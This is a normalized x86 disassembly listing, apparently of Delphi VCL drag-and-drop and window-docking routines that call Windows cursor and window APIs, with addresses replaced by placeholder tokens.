mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_40338c
xor edx edx
sub_44a85c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4556f0
sub_44a87c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4556d8
sub_44a8a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44a788
mov dl 0x1
mov eax [ r-xdata ]
call sub_424064
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42a714
mov edx eax
mov eax esi
call sub_4241e0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_44a904
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_44a934
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a7ac
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_44a990
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_40338c
pop edi
pop esi
pop ebp
retn 0x4
sub_44a9b4
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_44a9d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44a9b4
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44a9b4
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44aa94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_44ab00
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_44af50
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44a018
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_453a88
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_453a88
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_453a88
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_40338c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_44aa94
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_453a88
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_453a88
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_44ac98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_453a88
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_453a88
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_44acdc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_44a4f4
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_44ab00
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_418470
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_453a88
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_44ac98
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_40338c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4525b8
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44a464
sub_44ae38
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_4184cc
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_418360
mov edx edi
mov eax [ rw-data ]
call sub_418314
jmp r-xdata
sub_44ae98
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_44aef0
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4043e0
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_449fe4
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_44af50
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44aef0
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44af7c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_44acdc
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_44af50
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_44ae98
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_453a88
mov [ esi ] eax
sub_44afcc
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_44ae98
cmp eax 0x1
sbb eax eax
inc eax
sub_44b008
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_452524
test eax eax
je r-xdata
mov eax esi
call sub_452524
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_44ba38
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_418470
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4184cc
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_452538
mov edi eax
jmp r-xdata
sub_44b09c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_44af7c
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4555ac
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_44afcc
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_44afcc
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_44ccd0
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_44afcc
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b224
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_455568
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_44b008
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_40338c
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_455694
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_4555ac
jmp r-xdata
mov eax [ rw-data ]
call sub_455708
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b224
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_44ccd0
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_40338c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_40338c
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407dac
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_44b36c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_44a598
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4555ac
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_44b09c
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_44b4dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_44b681
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_40338c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_40338c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a8a0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44b36c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a788
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_453a88
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_416e0c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_44cca4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_416e0c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_44b6a0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_40338c
mov ebx eax
sub_44b714
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44b9e0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_44b96e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_44a5e0
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403340
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_44b6a0
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_44afcc
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_455708
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b975
mov eax [ rw-data ]
call sub_403190
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_464518
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_44e340
jmp r-xdata
